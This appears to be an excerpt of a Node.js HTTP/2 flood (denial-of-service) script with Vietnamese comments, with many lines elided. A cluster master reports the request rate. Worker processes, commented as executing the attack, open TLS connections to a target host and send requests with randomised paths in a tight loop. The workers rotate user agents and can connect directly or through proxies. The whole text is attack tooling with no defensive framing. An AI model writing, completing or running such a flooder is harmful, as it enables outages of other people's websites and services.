...
if (cluster.isMaster) {
    ...
    setInterval(() => {
        ...
        console.log(`   ⚡ PROTOCOL: \x1b[31mHTTP/2 ONLY (ULTRA MAX RPS)\x1b[35m`);
    ...
    // --- WORKER: THỰC THI TẤN CÔNG & GOM DỮ LIỆU ---
    const workerUA = JSON.parse(process.env.UA_LIST || "[]");
    
    // [TỐI ƯU 1]: TẠO SẴN BỂ CHỨA CHUỖI NGẪU NHIÊN ĐỂ GIẢM TẢI CPU
    const randomPool = [];
    for (let i = 0; i < 5000; i++) {
        randomPool.push(randomString(10));
    }
    let poolIndex = 0;
    ...
    function runFlooder() {
        ...
        // [TỐI ƯU 2]: KHAI BÁO BASE HEADERS 1 LẦN DUY NHẤT NGOÀI VÒNG LẶP
        const baseHeaders = {
            ...
            const tlsConn = tls.connect(443, parsedTarget.host, {
                ...
                client.on("connect", () => {
                    const attackInterval = setInterval(() => {
                        // Vòng lặp siêu tốc - Gần như không tốn CPU tính toán
                        for (let i = 0; i < args.Rate; i++) {
                            // Chỉ ghi đè lại :path bằng cách bốc chuỗi có sẵn từ Bể chứa (Pool)
                            baseHeaders[":path"] = basePath + randomPool[poolIndex++ % 5000];
        ...
        if (isNoProxy) {
            const directSocket = net.connect(443, parsedTarget.hostname, () => {
                sendH2Request(directSocket);
            });
            directSocket.on("error", () => directSocket.destroy());
        } else {
            ...
            Socker.HTTP({
                ...
                sendH2Request(connection);
            });
        }
    }
} // DẤU NGOẶC KẾT THÚC FILE